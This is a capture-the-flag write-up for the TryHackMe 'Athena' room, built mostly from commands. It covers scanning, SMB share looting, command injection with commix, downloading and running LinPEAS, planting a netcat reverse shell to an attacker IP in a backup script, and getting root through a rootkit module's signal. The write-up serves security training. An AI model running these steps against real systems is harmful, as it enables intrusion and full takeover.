# Athena

**Room Link:** [https://tryhackme.com/r/room/4th3n4](https://tryhackme.com/r/room/4th3n4)

### **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **TCP/139 - NetBIOS** <a href="#tcp-139-netbios" id="tcp-139-netbios"></a>

**Kali**

```
nbtscan $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
enum4linux $VICTIM
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **TCP/445 - SMB**

**Kali**

```
smbclient \\\\$VICTIM\\public
prompt
mget *
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## **TCP/80 - HTTP**

#### Find Pages <a href="#find-pages" id="find-pages"></a>

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```





<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

### Shell #1

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone https://github.com/commixproject/commix.git commix
cd commix/
python commix.py -r ../request.txt 
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Shell #2

**Kali**

```
nc -lvnp 1337
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Full TTY

```
script -qc /bin/bash /dev/null
ctrl + Z
stty raw -echo;fg
```



## Lateral Movement

### **LinPeas**

**Kali**

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
python2 -m SimpleHTTPServer 82
```

**Victim**

```
cd /tmp/
wget http://$KALI:82/linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
nc -lvnp 1338
```



**Victim**

```
echo '#!/bin/bash' > /usr/share/backup/backup.sh
echo "/usr/bin/nc 10.10.35.7 1338 -e /bin/bash" >> /usr/share/backup/backup.sh
```

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Full TTY

```
script -qc /bin/bash /dev/null
ctrl + Z
stty raw -echo;fg
```

## Privilege Escalation&#x20;

**Victim(athena)**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(athena)**

```
cd /mnt/.../secret/
modinfo venom.ko
```

<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(athena)**

```
kill -57 271
id
```

<figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

